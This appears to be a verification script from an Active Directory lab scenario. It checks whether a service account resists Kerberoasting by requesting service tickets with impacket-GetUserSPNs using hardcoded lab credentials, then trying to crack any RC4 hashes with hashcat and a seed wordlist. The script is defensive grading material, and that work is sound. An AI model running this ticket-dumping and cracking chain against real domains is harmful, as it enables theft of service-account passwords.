#!/usr/bin/env bash
# meta4/ad-vm/scenario-03/verify-poc.sh
# PASS (exit 0) iff svc_sql is not RC4-Kerberoastable with a seed wordlist.

set -euo pipefail

cd "$(mktemp -d)"

/usr/bin/impacket-GetUserSPNs \
    -request -dc-ip 10.20.30.5 \
    -outputfile ks.hashes \
    'corp.local/alice:Password1!' 2>&1 | tee ks.out || true

echo "--- GetUserSPNs output ---"
cat ks.out
echo "--- /GetUserSPNs ---"

if [ ! -s ks.hashes ]; then
    if grep -qiE 'cannot find spn|no user found|no entries found' ks.out; then
        echo "[verify-poc-03] no roastable account for svc_sql -- BLOCKED"
        exit 0
    fi
fi

# If only AES (\$krb5tgs\$18\$) hashes returned, the RC4 cracking path
# is closed.
if grep -qE '\$krb5tgs\$18' ks.hashes && ! grep -qE '\$krb5tgs\$23\$' ks.hashes; then
    echo "[verify-poc-03] only AES TGS returned -- RC4 path closed, BLOCKED"
    exit 0
fi

# Need an RC4 hash to attempt offline crack. Without RC4 = blocked.
if ! grep -qE '\$krb5tgs\$23\$' ks.hashes; then
    echo "[verify-poc-03] no RC4 TGS in dump -- BLOCKED"
    exit 0
fi

# Seed wordlist with the inject password + common rotations.
cat > wl <<'EOF'
Password1!
Autumn24
Summer24
Winter24
Spring24
Welcome1
Welcome24
Service123
Service24
EOF

if ! command -v hashcat >/dev/null 2>&1; then
    echo "[verify-poc-03] hashcat unavailable; cannot validate crack -- BLOCKED"
    exit 0
fi

CRACK=$(timeout 45 hashcat -m 13100 -a 0 --quiet --potfile-path=/dev/null ks.hashes wl 2>&1 || true)
echo "--- hashcat output ---"
echo "$CRACK"

# A successful crack appears as a line ending with the cleartext after :,
# e.g. '$krb5tgs$23$...:Autumn24'.
if echo "$CRACK" | grep -qE '\$krb5tgs\$23\$.*:[A-Za-z0-9!]+$'; then
    PW=$(echo "$CRACK" | grep -oE ':[^:]+$' | tail -1 | tr -d ':')
    echo "[verify-poc-03] cracked svc_sql password '$PW' -- PoC SUCCEEDED" >&2
    exit 1
fi

echo "[verify-poc-03] RC4 hash dumped but pwd uncracked in seed wordlist -- BLOCKED"
exit 0
